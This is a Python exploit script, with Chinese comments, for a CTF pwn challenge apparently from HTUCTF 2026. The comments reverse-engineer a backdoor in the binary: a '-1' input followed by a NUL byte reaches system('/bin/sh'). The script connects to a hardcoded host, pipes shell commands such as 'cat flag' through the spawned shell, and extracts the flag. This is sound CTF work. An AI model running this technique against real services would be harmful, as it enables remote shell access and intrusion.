#!/usr/bin/env python3
# 冥河螺旋 (486) - HTUCTF 2026 (challenge id 69)
#
# 程序（64 位 PIE）逻辑：
#   main:  srand(time(0)); puts("嘿，小哥，要来个苹果吗？"); game(0x1520)
#   game:  猜拳循环：fgets(buf,0x20)
#            if *(int*)buf == 0x000a312d  ("-1\n")  -> puts("我一定会，拯救你！"); backdoor(0x1490)
#            else  rand()%3 决定"死亡回归"台词，错 6 次就 puts("希望你能，从零开始") + exit
#   backdoor(0x1490):
#            xmm0 = "styxhelix"; movaps [rsp], xmm0      // 先往栈上写 9 字节提示串
#            read(0, rsp, 9)
#            if (strlen(rsp) <= 1) { puts("我的名字是菜月昴！..."); system("/bin/sh"); }
#            else                  { puts("真是傲慢啊....(进入傲慢if)"); guess_loop(0x1390); }
#   guess_loop(0x1390): arc4random() 转成 4 字节原始字节串，与 strtol(输入) 的 4 字节比较，
#            相等才 system("/bin/sh")（理论上靠 random 低字节为 0 才能撞进去，是另一条路）
#
# 解法（"从零开始"）：先发 "-1\n" 进后门，再发 1 个 NUL 字节 ——
#   buf[0]=0 => strlen=0 <= 1 => 直接 system("/bin/sh")
#
# 坑 1：read(0, rsp, 9) 会吃掉最多 9 字节输入，而 /bin/sh 共用同一个 stdin，
#       所以 shell 命令必须塞在同一个 TCP 包里，且前面要有 8 字节填充给 read 吃掉。
#       用 "8 个字符 + \n" 当填充最稳（万一 read 少吃了，剩下的也只是一个注释/无害行）。
# 坑 2：分两次发（先 NUL 再发命令）会 RST，shell 秒死；必须整包。
import socket
import re
import sys
import time

HOST = "103.163.47.230"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 33609
CMD = b"cat flag;ls -la\n"


def exploit(port=PORT, cmd=CMD, verbose=True):
    s = socket.create_connection((HOST, port), timeout=10)
    s.settimeout(1.0)
    try:
        s.recv(4096)                        # "嘿，小哥，要来个苹果吗？/ 做出你的选择吧!"
    except socket.timeout:
        pass

    s.sendall(b"-1\n")                      # 触发后门
    time.sleep(0.25)
    try:
        s.recv(4096)                        # "我一定会，拯救你！"
    except socket.timeout:
        pass

    # NUL + 8 字节填充 被 read(0,rsp,9) 吃掉；剩下的 "\n" + 命令 留给 /bin/sh
    s.sendall(b"\x00" + b"AAAAAAAA" + b"\n" + cmd)

    time.sleep(1.2)
    out = b""
    s.settimeout(2.5)
    try:
        while True:
            c = s.recv(8192)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    s.close()
    if verbose:
        sys.stdout.write(out.decode("utf-8", "replace"))
    return out


if __name__ == "__main__":
    o = exploit()
    m = re.search(rb"HTUCTF\{[^}]*\}", o)
    if m:
        print("\n[flag]", m.group().decode())
